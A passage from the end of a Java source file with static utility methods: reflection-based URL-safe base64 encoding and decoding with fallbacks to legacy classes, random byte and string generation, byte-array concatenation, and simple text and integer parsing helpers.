        return m;
    }

    static byte[] b64enc(byte[] data) {
        try {
            if (M_ENCODE_TO_STRING != null) {
                return ((String) M_ENCODE_TO_STRING.invoke(B64_ENC, new Object[]{data})).getBytes(ASCII);
            }
            String s = (String) M_ENCODE.invoke(B64_ENC, new Object[]{data});
            s = s.replaceAll("\\s+", "").replace('+', '-').replace('/', '_');
            while (s.endsWith("=")) {
                s = s.substring(0, s.length() - 1);
            }
            return s.getBytes(ASCII);
        } catch (Throwable e) {
            return EMPTY;
        }
    }

    static byte[] b64dec(String s) throws IOException {
        s = s.replace('-', '+').replace('_', '/');
        while (s.length() % 4 != 0) {
            s += "=";
        }
        try {
            if (M_DECODE != null) {
                return (byte[]) M_DECODE.invoke(B64_DEC, new Object[]{s});
            }
            return (byte[]) M_DECODE_BUFFER.invoke(B64_DEC, new Object[]{s});
        } catch (Throwable e) {
            throw new IOException("base64 decode failed");
        }
    }

    private static Object initEncoder() {
        try {
            Class c = Class.forName("java.util.Base64");
            Object enc = c.getMethod("getUrlEncoder", new Class[0]).invoke(c, new Object[0]);
            return enc.getClass().getMethod("withoutPadding", new Class[0]).invoke(enc, new Object[0]);
        } catch (Throwable e) {
            try {
                return Class.forName("sun.misc.BASE64Encoder").newInstance();
            } catch (Throwable e2) {
                return null;
            }
        }
    }

    private static Object initDecoder() {
        try {
            Class c = Class.forName("java.util.Base64");
            return c.getMethod("getDecoder", new Class[0]).invoke(c, new Object[0]);
        } catch (Throwable e) {
            try {
                return Class.forName("sun.misc.BASE64Decoder").newInstance();
            } catch (Throwable e2) {
                return null;
            }
        }
    }

    private static Method findMethod(Object obj, String name, Class arg) {
        if (obj == null) {
            return null;
        }
        try {
            return obj.getClass().getMethod(name, new Class[]{arg});
        } catch (Throwable e) {
            return null;
        }
    }

    static byte[] randomBytes(int n) {
        byte[] b = new byte[n];
        ((Random) RANDOM.get()).nextBytes(b);
        return b;
    }

    static String randomString(int n) {
        String cs = "abcdefghijklmnopqrstuvwxyz0123456789";
        Random r = (Random) RANDOM.get();
        StringBuilder sb = new StringBuilder(n);
        for (int i = 0; i < n; i++) {
            sb.append(cs.charAt(r.nextInt(cs.length())));
        }
        return sb.toString();
    }

    static byte[] concat(byte[] a, byte[] b) {
        byte[] r = new byte[a.length + b.length];
        System.arraycopy(a, 0, r, 0, a.length);
        System.arraycopy(b, 0, r, a.length, b.length);
        return r;
    }

    private static String text(byte[] b) {
        return b == null ? "" : new String(b, UTF8);
    }

    private static int parseInt(byte[] b, int def) {
        try {
            return Integer.parseInt(text(b));
        } catch (Exception e) {
            return def;
        }
    }
}
